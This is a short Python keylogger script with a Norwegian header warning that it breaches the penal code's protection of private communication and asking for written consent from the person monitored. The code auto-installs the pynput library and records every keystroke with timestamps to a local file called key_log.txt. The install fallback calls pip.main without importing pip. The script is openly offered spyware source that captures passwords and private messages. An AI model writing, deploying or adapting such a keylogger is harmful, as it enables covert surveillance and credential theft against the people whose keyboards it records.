"""
Denne programvare er i strid med straffeloven paragraf 205,
retten til privat kommunikasjon.

Bare bruk denne programvaren om du har fått skriftlig tillatelse
fra vedkommende du kommer til å bruke den på! :)
"""

import time
import logging

try:
    from pynput.keyboard import Key, Listener
except ImportError:
    pip.main(['install', "pynput"])
    from pynput.keyboard import Key, Listener

log_dir = ''

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")


def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
